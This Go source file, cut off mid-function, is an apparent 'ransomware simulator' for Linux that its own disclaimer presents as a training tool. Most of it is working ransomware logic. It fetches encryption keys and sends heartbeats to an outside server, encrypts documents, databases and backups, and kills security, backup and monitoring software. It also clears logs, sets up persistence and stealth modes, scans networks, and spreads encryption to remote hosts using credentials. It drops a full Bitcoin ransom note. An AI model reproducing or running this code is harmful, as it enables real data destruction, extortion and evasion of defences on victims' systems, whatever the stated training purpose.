// ransom_simulator_linux.go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	version = "v3.8"

	// 终端心跳：每 30 秒上报一次，管理后台超过 90 秒未收到即判定离线
	heartbeatInterval = 30 * time.Second
)

// apiURL 密钥获取地址；heartbeatURL 心跳上报地址。
// 以变量形式声明，便于单元测试指向本地服务或不可达地址。
var (
	apiURL         = "https://encrypt.yangzifun.org/E56dSY"
	heartbeatURL   = "https://encrypt.yangzifun.org/api/heartbeat"
	heartbeatToken = ""
)

const (
	// 大文件部分加密阈值和相关常量
	largeFileThreshold = 1 * 1024 * 1024 * 1024 // 1GB 阈值，超过此大小使用部分加密
	chunkSize          = 1 * 1024 * 1024        // 每个加密块 1MB
	headChunks         = 1                      // 头部加密块数
	tailChunks         = 1                      // 尾部加密块数
	middleRandomChunks = 5                      // 中间随机块数
	minFileForPartial  = chunkSize * 3          // 最小部分加密文件大小（至少3个块）
)

const ransomNoteContent = `
================================================================================
   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
================================================================================

[ WARNING: Read the following carefully, or you may lose your data permanently ]
[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]

--------------------------------------------------------------------------------
ENGLISH version
--------------------------------------------------------------------------------

Q: What happened?
A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.

Attempts to modify or rename encrypted files may result in permanent data corruption.

Q: How to restore my files?
A: The only way to restore files is to purchase the decryption tool and private key from us.

1. Download and install Tor Browser (https://www.torproject.org/).
2. Visit our recovery page: [onion_address_placeholder]
3. Enter your unique Personal ID: %s

Payment Terms:
You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
- If over 72 hours, the price will double.
- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.

Free Decryption Test:
To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.

Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.

--------------------------------------------------------------------------------
中文版本 (Chinese Version)
--------------------------------------------------------------------------------

问：发生了什么？
答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。

试图修改或重命名加密文件可能会导致数据永久损坏。

问：如何恢复我的文件？
答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。

1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
3. 输入您的唯一个人ID: %s

付款条款：
您必须以比特币（Bitcoin）支付赎金。
价格取决于您与其联系的速度。
- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
- 如果超过 72 小时，价格将翻倍。
- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。

免费解密测试：
为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。

切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。

[攻击者组织名称/签名]

====================== [ 这是一次用于安全培训的模拟 ] ======================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
%s
https://encrypt.yangzifun.org/
获取私钥ID是: %s

项目仓库链接：https://git.yangzifun.org/YZFN/ransom_simulator
免责声明与许可
本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

`

// 勒索信正文中的“源文件”提示段落（依据 -remove 选项二选一）
const (
	ransomNoteKeepNotice   = "本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序："
	ransomNoteDeleteNotice = "本程序已删除加密后的原文件，仅保留加密文件，如需恢复请通过下方链接获取私钥及解密程序："
)

// ransomNoteNotice 根据是否删除源文件返回对应的提示段落
func ransomNoteNotice(removeOriginal bool) string {
	if removeOriginal {
		return ransomNoteDeleteNotice
	}
	return ransomNoteKeepNotice
}

var (
	lockFilePath            string
	ransomNoteFileName      = "!!!_如何解密你的文件_!!!.txt"
	ransomWallpaperFileName = "ransom_wallpaper.png"

	// 阶段2行为控制变量
	stealthMode     bool
	noStopServices  bool
	noKillProcs     bool
	noClearLogs     bool
	aggressiveDelay int // 操作间随机延迟上限（毫秒），0=无延迟

	// 日志相关变量
	logEnabled        bool
	logDirectory      string
	successLogFile    *os.File
	failedLogFile     *os.File
	operationsLogFile *os.File

	// 公钥缓存，避免重复解析
	publicKeyCache     *rsa.PublicKey
	publicKeyCacheStr  string
	publicKeyCacheLock sync.RWMutex

	// 公钥变量
	publicKeyPEM string

	// 程序所在目录
	programDir string

	// 进程监控相关
	monitorMode bool // 主进程监控模式
	workerMode  bool // Worker子进程模式
	workerPID   int  // 当前worker的PID

	// 目标进程列表（包括数据库和安全软件）
	targetProcessesLinux = []string{
		// 文本编辑器
		"gedit", "vim", "nano", "emacs", "vi",
		// 数据库服务
		"mysqld", "mysql", "mariadb", "postgres", "postmaster", "mongod", "mongos",
		"redis-server", "redis", "oracle", "sqlplus", "sqlldr", "sqlcl",
		"cassandra", "couchdb", "neo4j", "influxd",
		// 数据库管理工具
		"phpmyadmin", "adminer", "dbeaver", "navicat", "sqldeveloper",
		// 安全软件（阿里云安骑士）
		"aliyun-service", "aegis", "yundun", "yundun-sdk", "yundun_detect",
		"cloudmonitor", "cloudmonitoragent", "sagent", "AliYunDun",
		// 其他安全软件
		"clamav", "clamd", "freshclam", "rkhunter", "chkrootkit", "tripwire",
		"ossec", "suricata", "snort", "fail2ban",
		// 备份工具
		"rsync", "backup", "duplicity", "bacula", "amanda",
		// 监控工具
		"zabbix_agentd", "nagios", "cacti", "munin-node",
	}

	// 数据库服务和守护进程
	databaseServices = []string{
		"mysql", "mariadb", "postgresql", "mongod", "redis",
		"oracle-xe", "oracle-rdbms", "cassandra", "couchdb",
		"elasticsearch", "influxdb", "clickhouse",
	}

	// 安全软件服务
	securityServices = []string{
		"aliyun-service", "aegis", "yundun", "cloudmonitor",
		"clamav-daemon", "rkhunter", "ossec", "suricata", "snort",
	}

	// 排除目录
	excludedDirsLinux = []string{
		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64",
		"/proc", "/run", "/sbin", "/sys", "/usr", "/var",
		"/tmp", "/lost+found", "/Applications", "/Library",
		"/System", "/private", "/snap", "/opt/google",
	}

	// 目标扩展名（增加数据库相关格式）
	targetExtensions = []string{
		// 文档文件
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub",
		// 网页文件
		".html", ".htm", ".xhtml", ".mht", ".mhtml",
		// 压缩文件
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
		// 图片文件
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
		// 数据库文件
		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
		".wal", ".journal", ".rdb", ".aof", ".dump", ".backup",
		// 配置文件
		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
		".properties", ".env", ".toml",
		// 备份文件
		".bak", ".backup", ".old", ".temp", ".tmp", ".swp",
		// 代码文件
		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
		".php", ".rb", ".pl", ".sh", ".bash",
		// 虚拟化和容器文件
		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
		".dockerfile", ".dockerignore",
		// 其他重要文件
		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
		".pcap", ".log", ".tar.gz", ".tar.bz2",
	}

	// 数据库数据目录
	databaseDataDirs = []string{
		"/var/lib/mysql",
		"/var/lib/postgresql",
		"/var/lib/mongodb",
		"/var/lib/redis",
		"/opt/oracle",
		"/u01/app/oracle",
		"/var/lib/cassandra",
		"/var/lib/couchdb",
		"/var/lib/elasticsearch",
		"/var/lib/influxdb",
		"/home/mysql",
		"/data/mysql",
		"/data/db",
	}

	// 用于处理 rand.Reader 冲突的函数引用
	cryptoReader = rand.Reader
)

var wg sync.WaitGroup

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

// encryptedChunk 描述部分加密中的一个数据块
type encryptedChunk struct {
	Offset int64  `json:"offset"`
	Size   int    `json:"size"`
	Nonce  []byte `json:"nonce"`
	Data   []byte `json:"data"`
}

// options 汇总全部命令行参数（含定时触发 / 攻击面侦察 / 远程横向加密）
type options struct {
	workers         int
	dryRun          bool
	extensions      string
	directory       string
	removeOriginal  bool
	logFlag         bool
	stealthMode     bool
	noStopServices  bool
	noKillProcs     bool
	noClearLogs     bool
	aggressiveDelay int

	// 后台驻留与密钥保留
	resident bool
	keepKey  bool

	// 定时任务后台化
	foreground  bool
	noAutostart bool
	daemonChild bool

	// 定时触发
	delay            time.Duration
	atTime           string
	randomDelay      time.Duration
	persistSchedule  bool
	scheduleTaskName string
	scheduleCleanup  bool
	scheduledRun     bool

	// 模拟攻击扫描（攻击面侦察）
	scan            bool
	scanOnly        bool
	scanTargets     string
	scanTargetsFile string
	scanPorts       string
	scanWorkers     int
	scanTimeout     time.Duration
	scanICMP        bool

	// 远程横向加密编排
	remoteHosts     string
	remoteHostsFile string
	remoteAuto      bool
	remoteUser      string
	remotePass      string
	remoteDomain    string
	remoteKey       string
	remotePort      int
	remoteMethod    string
	remoteStaging   string
	remoteArgs      string
	remoteConfirm   bool
	remoteCleanup   bool
}

// remoteRequested 判断是否请求了远程横向加密
func (o *options) remoteRequested() bool {
	return strings.TrimSpace(o.remoteHosts) != "" ||
		strings.TrimSpace(o.remoteHostsFile) != "" ||
		o.remoteAuto
}

func main() {
	// 检查是否为 worker 子进程模式，必须在最前面处理
	for _, arg := range os.Args[1:] {
		if arg == "--worker" {
			runWorker()
			return
		}
	}

	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - Linux增强版      ")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")

	// 获取程序所在目录
	initProgramDir()

	fmt.Println("\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	opt := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
		os.Exit(1)
	}

	stealthMode = opt.stealthMode
	noStopServices = opt.noStopServices
	noKillProcs = opt.noKillProcs
	noClearLogs = opt.noClearLogs
	aggressiveDelay = opt.aggressiveDelay

	// 初始化日志系统
	initLogging(opt.logFlag)
	defer closeLogFiles()

	// 远程编排模式：指定了远程目标但未指定本地 -dir，则只做远程横向加密
	remoteOnly := opt.remoteRequested() && strings.TrimSpace(opt.directory) == ""

	// 系统定时任务唤起后的运行在结束时自动清理任务
	if wasScheduledRun() && opt.scheduleCleanup {
		defer func() {
			cleanupPersistentSchedule(opt.scheduleTaskName)
			markScheduleDone(opt)
		}()
	}

	// ---------- 阶段 0: 定时触发（--delay / --at / --random-delay / --persist-schedule）----------
	if !wasScheduledRun() {
		startAt, needWait, err := resolveStartTime(opt)
		if err != nil {
			fmt.Printf("[!] 定时参数错误: %v\n", err)
			os.Exit(2)
		}
		if opt.persistSchedule {
			if err := registerPersistentSchedule(opt, startAt); err != nil {
				fmt.Printf("[!] 注册系统定时任务失败，回退为进程内等待: %v\n", err)
			} else {
				fmt.Println("[*] 定时任务已注册，当前进程退出；到点后由系统唤起并直接执行。")
				if logEnabled {
					logOperation("系统定时任务注册完成，主进程退出")
				}
				countdown("此终端将在", 5)
				return
			}
		}

		// 已完成的定时任务子进程：清理开机自启后退出，避免重启后重复执行
		if isDaemonChild() && isScheduleDone(opt) {
			fmt.Println("[*] 检测到该定时任务已完成，子进程退出。")
			removeAutoStart(opt.scheduleTaskName)
			return
		}

		// 显式定时（--delay / --at）：默认后台化（setsid，无需 nohup）并注册开机自启
		explicitSchedule := opt.delay > 0 || strings.TrimSpace(opt.atTime) != ""
		if needWait && explicitSchedule && !opt.foreground && !isDaemonChild() {
			clearScheduleDone(opt)
			autoRegistered := false
			if !opt.noAutostart {
				if regErr := registerAutoStart(opt, startAt); regErr != nil {
					fmt.Printf("[!] 注册开机自启失败（重启后需手动启动）: %v\n", regErr)
				} else {
					autoRegistered = true
				}
			}
			logPath := scheduleLogPath()
			pid, spawnErr := spawnDaemon(buildDaemonArgs(startAt), logPath)
			if spawnErr == nil {
				fmt.Println()
				fmt.Printf("[+] 定时任务已转入后台运行: PID %d\n", pid)
				fmt.Printf("[*] 计划启动时间: %s\n", startAt.Format("2006-01-02 15:04:05"))
				if autoRegistered {
					fmt.Println("[+] 已注册开机自启，重启后定时任务仍然有效")
				}
				fmt.Printf("[*] 后台日志: %s\n", logPath)
				fmt.Println("[*] 当前终端可安全关闭（已脱离终端，无需 nohup）；如需前台等待请加 --foreground")
				return
			}
			fmt.Printf("[!] 转入后台失败，回退前台等待: %v\n", spawnErr)
		}

		if needWait {
			if !waitUntilStart(startAt, opt) {
				return
			}
		}
	}

	// 后台子进程运行结束后清理任务与开机自启
	if isDaemonChild() && opt.scheduleCleanup {
		defer func() {
			cleanupPersistentSchedule(opt.scheduleTaskName)
			markScheduleDone(opt)
		}()
	}

	if opt.scanOnly {
		fmt.Println(">>> 已激活 [仅侦察模式]，不会执行任何加密或破坏性操作。")
	} else {
		showWarning(opt.dryRun)
	}

	// ---------- 阶段 1.5: 攻击面侦察（模拟攻击扫描）----------
	var recon *reconReport
	if opt.scan || opt.scanOnly || opt.remoteAuto {
		recon = runRecon(opt)
	}
	if opt.scanOnly {
		fmt.Println("\n================== [ 侦察完成 ] ==================")
		if recon != nil {
			fmt.Printf("  - 扫描目标:        %d\n", recon.Summary.Targets)
			fmt.Printf("  - 存活主机:        %d\n", recon.Summary.AliveHosts)
			fmt.Printf("  - 开放端口:        %d\n", recon.Summary.OpenPorts)
			fmt.Printf("  - 高危主机:        %d\n", recon.Summary.HighRisk)
			fmt.Printf("  - 可远程投递:      %d\n", recon.Summary.RemoteReady)
		}
		fmt.Println("[*] --scan-only 已启用: 不执行加密与破坏性操作。")
		if logEnabled {
			logOperation("--scan-only 模式结束（仅侦察）")
		}
		countdown("此终端将在", 10)
		return
	}

	fmt.Println("\n[阶段 2: 防御规避与发现]")

	// 终端心跳：启动后立即上报，之后每 30 秒一次，供管理后台统计在线终端
	hbMode := "attack"
	if opt.dryRun {
		hbMode = "dry-run"
	} else if remoteOnly {
		hbMode = "remote"
	} else if stealthMode {
		hbMode = "stealth"
	}
	startHeartbeat(hbMode)
	defer stopHeartbeat()

	if opt.dryRun {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else if remoteOnly {
		fmt.Println("[*] [远程编排模式] 跳过本地破坏性操作，仅执行远程横向加密。")
	} else if stealthMode {
		fmt.Println("[*] [隐秘模式] 完全跳过阶段2所有破坏性操作。")
	} else {

		// 停止服务（可跳过）
		if !noStopServices {
			fmt.Println("\n[+] 停止数据库和安全服务...")
			stopDatabaseServices()
			stopSecurityServices()
		} else {
			fmt.Println("\n[*] [跳过] 停止数据库和安全服务")
		}

		// 清理数据库内存和缓存（可跳过）
		if !noStopServices {
			fmt.Println("\n[+] 清理数据库内存和缓存...")
			cleanDatabaseMemory()
			clearSystemCache()
		} else {
			fmt.Println("\n[*] [跳过] 清理数据库内存和缓存")
		}

		// 解除进程守护（可跳过，该操作极易触发安全告警）
		if !noStopServices {
			fmt.Println("\n[+] 解除进程守护...")
			disableProcessWatchdogs()
		} else {
			fmt.Println("\n[*] [跳过] 解除进程守护")
		}

		// 解挂数据库链接（可跳过）
		if !noStopServices {
			fmt.Println("\n[+] 解挂数据库链接...")
			unmountDatabaseConnections()
		} else {
			fmt.Println("\n[*] [跳过] 解挂数据库链接")
		}

		// 终止进程（可跳过）
		if !noKillProcs {
			killLockingProcesses()
		} else {
			fmt.Println("\n[*] [跳过] 终止占用文件的进程")
		}

		// 破坏性操作（可跳过）
		if !noClearLogs {
			simulateDestructiveActions()
		} else {
			fmt.Println("\n[*] [跳过] 清除备份和日志文件")
		}
	}

	extFilter := make(map[string]bool)
	if opt.extensions != "" {
		exts := strings.Split(opt.extensions, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if opt.directory != "" {
		dirs := strings.Split(opt.directory, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	var filesToProcess []string
	if remoteOnly {
		fmt.Println("[*] 远程编排模式(-dir 未指定): 跳过本地文件扫描，仅执行远程横向加密。")
	} else {
		fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
		filesToProcess = scanFiles(extFilter, scanRoots, encryptAllFormats)
		if len(filesToProcess) == 0 {
			fmt.Println("[!] 未找到任何有价值的目标文件。")
			if !opt.remoteRequested() {
				fmt.Println("[!] 任务中止。")
				stopHeartbeat()
				os.Exit(0)
			}
		} else {
			fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))
		}
	}

	var stats counters
	var finalUUID = "本地密钥模式"
	var publicKeyValue, publicKeyFilePath, keyCachePath string

	// 统一获取密钥：本地加密（非演习）与远程编排共用同一密钥，避免生成两份 UUID
	if !opt.dryRun || opt.remoteRequested() {
		uuid, pem, source, err := acquireKeys()
		if err != nil {
			fmt.Printf("[!] 获取密钥失败: %v\n", err)
			remindLocalKey()
			if !opt.dryRun {
				// 保留终端并给出可操作提示，避免无提示直接退出
				countdown("此终端将在", 15)
				stopHeartbeat()
				os.Exit(1)
			}
		} else {
			finalUUID = uuid
			publicKeyValue = pem
			setHeartbeatKey(uuid)
			rememberKey(uuid, pem)
			if opt.keepKey {
				if path, cerr := persistKeyCache(uuid, pem, hbMode, opt.removeOriginal); cerr != nil {
					fmt.Printf("[!] 密钥缓存写入失败: %v\n", cerr)
				} else {
					keyCachePath = path
					fmt.Printf("[+] 密钥已保存在内存与本地缓存（不会被清理）: %s\n", path)
				}
			}
			fmt.Printf("[*] 当前密钥来源: %s\n", source)
			if p, perr := ensureLocalPublicKeyFile(uuid, pem); perr != nil {
				fmt.Printf("[!] %v\n", perr)
			} else {
				publicKeyFilePath = p
			}
		}
	}

	if opt.dryRun {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else if len(filesToProcess) == 0 {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Println("[*] 无本地目标文件，跳过本地加密。")
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", opt.workers)

		// 使用进程监控模式运行加密工作
		runEncryptionWithMonitor(filesToProcess, opt.workers, &stats, finalUUID, publicKeyValue, opt.removeOriginal)

		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !opt.dryRun && !remoteOnly {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, ransomNoteNotice(opt.removeOriginal), finalUUID)
		desktopPath := getLinuxDesktopPath()
		if desktopPath != "" {
			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
		}
		createRansomWallpaper(finalUUID, opt.removeOriginal)
	} else if remoteOnly {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		fmt.Println("[*] [远程编排模式] 跳过本地勒索信投放与桌面壁纸篡改。")
	}

	// ---------- 阶段 5: 远程横向加密编排 ----------
	var remoteRep *remoteReport
	if opt.remoteRequested() {
		remoteRep = runRemoteEncryption(opt, recon, publicKeyFilePath)
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	if opt.dryRun {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
		fmt.Printf("  - 已停止服务:      %d 个\n", len(databaseServices)+len(securityServices))
	}
	if recon != nil {
		fmt.Printf("  - 侦察结果:        存活 %d / 目标 %d, 开放端口 %d, 高危主机 %d, 可远程投递 %d\n",
			recon.Summary.AliveHosts, recon.Summary.Targets, recon.Summary.OpenPorts,
			recon.Summary.HighRisk, recon.Summary.RemoteReady)
	}
	if opt.persistSchedule && !wasScheduledRun() {
		fmt.Printf("  - 定时任务:        %s\n", opt.scheduleTaskName)
	}
	if remoteRep != nil {
		fmt.Printf("  - 远程编排:        目标 %d 台, 模式 %s\n", len(remoteRep.Results), modeLabel(remoteRep.Mode))
		if remoteRep.JSONFile != "" {
			fmt.Printf("  - 远程报告:        %s\n", remoteRep.JSONFile)
		}
	}

	// 输出日志文件位置
	if logEnabled {
		fmt.Println("\n================== [ 日志文件 ] ==================")
		fmt.Printf("  - 成功日志:        %s\n", filepath.Join(logDirectory, "success_encrypted.log"))
		fmt.Printf("  - 失败日志:        %s\n", filepath.Join(logDirectory, "failed_encrypted.log"))
		fmt.Printf("  - 操作日志:        %s\n", filepath.Join(logDirectory, "operations.log"))
		fmt.Println("====================================================")
	}

	if opt.resident {
		runResidentLoop(finalUUID, keyCachePath)
	} else {
		countdown("此终端将在", 10)
	}
}

// 初始化程序所在目录
func initProgramDir() {
	exePath, err := os.Executable()
	if err != nil {
		// 如果无法获取可执行文件路径，则使用当前工作目录
		programDir, _ = os.Getwd()
		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\n", programDir)
	} else {
		programDir = filepath.Dir(exePath)
		fmt.Printf("[*] 程序所在目录: %s\n", programDir)
	}
}

// publicKeyFilePattern 严格公钥文件名：public_key_<uuid>.pem
var publicKeyFilePattern = regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)

// uuidFromKeyFileName 从公钥文件名提取 UUID；文件名不含合法 UUID 时返回空串。
func uuidFromKeyFileName(name string) string {
	if m := publicKeyFilePattern.FindStringSubmatch(name); m != nil && len(m) == 2 && isValidUUID(m[1]) {
		return m[1]
	}
	return ""
}

// uuidFromPublicKey 依据公钥指纹生成稳定 UUID（RFC 4122 v4 形式）。
// 用于文件名不含 UUID 的本地公钥，保证同一把公钥每次运行得到同一个 ID。
func uuidFromPublicKey(pub *rsa.PublicKey) string {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return "本地密钥模式"
	}
	sum := sha256.Sum256(der)
	sum[6] = (sum[6] & 0x0f) | 0x40
	sum[8] = (sum[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
}

// 验证UUID格式
func isValidUUID(uuid string) bool {
	if len(uuid) != 36 {
		return false
	}

	// 检查格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	parts := strings.Split(uuid, "-")
	if len(parts) != 5 {
		return false
	}

	lengths := []int{8, 4, 4, 4, 12}
	for i, part := range parts {
		if len(part) != lengths[i] {
			return false
		}
		// 检查是否为十六进制字符
		for _, ch := range part {
			if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
				return false
			}
		}
	}

	return true
}

// parseRSAPublicKey 解析 PEM 编码的 RSA 公钥（PKIX 或 PKCS#1）。
func parseRSAPublicKey(content []byte) (*rsa.PublicKey, error) {
	block, _ := pem.Decode(content)
	if block == nil {
		return nil, fmt.Errorf("无效的 PEM 格式")
	}
	if block.Type != "PUBLIC KEY" && block.Type != "RSA PUBLIC KEY" {
		return nil, fmt.Errorf("PEM 类型应为 PUBLIC KEY / RSA PUBLIC KEY，实际为 %q", block.Type)
	}
	pkixPub, pkixErr := x509.ParsePKIXPublicKey(block.Bytes)
	if pkixErr == nil {
		pub, ok := pkixPub.(*rsa.PublicKey)
		if !ok {
			return nil, fmt.Errorf("公钥不是 RSA 类型")
		}
		return pub, nil
	}
	if pkcs1Pub, pkcs1Err := x509.ParsePKCS1PublicKey(block.Bytes); pkcs1Err == nil {
		return pkcs1Pub, nil
	}
	return nil, fmt.Errorf("公钥解析失败: %v", pkixErr)
}

// keySearchDirs 返回本地公钥的查找目录：程序目录优先，其次当前工作目录，
// 最后是用户级密钥缓存目录。
func keySearchDirs() []string {
	dirs := []string{programDir}
	add := func(dir string) {
		if strings.TrimSpace(dir) == "" {
			return
		}
		for _, existing := range dirs {
			if strings.EqualFold(existing, dir) {
				return
			}
		}
		dirs = append(dirs, dir)
	}
	if wd, err := os.Getwd(); err == nil {
		add(wd)
	}
	add(keyCacheDir())
	return dirs
}

// keyCacheDir 保存联网成功后下发的公钥副本，供程序目录不可写时断网回退。
func keyCacheDir() string {
	base, err := os.UserConfigDir()
	if err != nil || strings.TrimSpace(base) == "" {
		return ""
	}
	return filepath.Join(base, "RansomSimulator", "keys")
}

// cachePublicKeyCopy 把 API 下发的公钥副本落到用户级缓存目录（失败仅忽略），
// 保证程序目录只读时，下一次断网运行仍能回退到本地密钥。
func cachePublicKeyCopy(uuid, pemText string) {
	dir := keyCacheDir()
	if dir == "" || strings.TrimSpace(uuid) == "" {
		return
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		return
	}
	_ = os.WriteFile(filepath.Join(dir, fmt.Sprintf("public_key_%s.pem", uuid)), []byte(pemText), 0600)
}

// loadLocalKey 从本机查找可用的 RSA 公钥文件。
// 程序目录优先；兼容 public_key_<uuid>.pem 以及 public_key.pem、任意 *.pem 文件名。
// 文件名不含 UUID 时按公钥指纹生成稳定 UUID。
func loadLocalKey() (uuid, pemText, filePath string, err error) {
	var reasons []string
	for _, dir := range keySearchDirs() {
		entries, readErr := os.ReadDir(dir)
		if readErr != nil {
			if !os.IsNotExist(readErr) {
				reasons = append(reasons, fmt.Sprintf("无法读取目录 %s: %v", dir, readErr))
			}
			continue
		}

		type candidate struct {
			name string
			rank int
		}
		var cands []candidate
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			name := entry.Name()
			lower := strings.ToLower(name)
			if !strings.HasSuffix(lower, ".pem") {
				continue
			}
			rank := 3 // 任意 .pem
			if publicKeyFilePattern.MatchString(name) {
				rank = 1 // public_key_<uuid>.pem
			} else if strings.HasPrefix(lower, "public_key") {
				rank = 2 // public_key.pem / public_key_xxx.pem
			}
			cands = append(cands, candidate{name: name, rank: rank})
		}
		sort.SliceStable(cands, func(i, j int) bool {
			if cands[i].rank != cands[j].rank {
				return cands[i].rank < cands[j].rank
			}
			return cands[i].name < cands[j].name
		})

		for _, c := range cands {
			full := filepath.Join(dir, c.name)
			content, readErr := os.ReadFile(full)
			if readErr != nil {
				reasons = append(reasons, fmt.Sprintf("读取 %s 失败: %v", full, readErr))
				continue
			}
			pub, parseErr := parseRSAPublicKey(content)
			if parseErr != nil {
				reasons = append(reasons, fmt.Sprintf("%s 不是可用公钥: %v", c.name, parseErr))
				continue
			}
			id := uuidFromKeyFileName(c.name)
			if id == "" {
				id = uuidFromPublicKey(pub)
			}
			return id, string(content), full, nil
		}
	}

	msg := fmt.Sprintf("程序目录 %s 下未找到可用公钥（期望 public_key_<uuid>.pem，也兼容 public_key.pem 等 *.pem）", programDir)
	if len(reasons) > 0 {
		msg += "；" + strings.Join(reasons, "；")
	}
	return "", "", "", fmt.Errorf("%s", msg)
}

// remindLocalKey 在完全找不到密钥时给出可操作提示（由调用方负责停留终端）。
func remindLocalKey() {
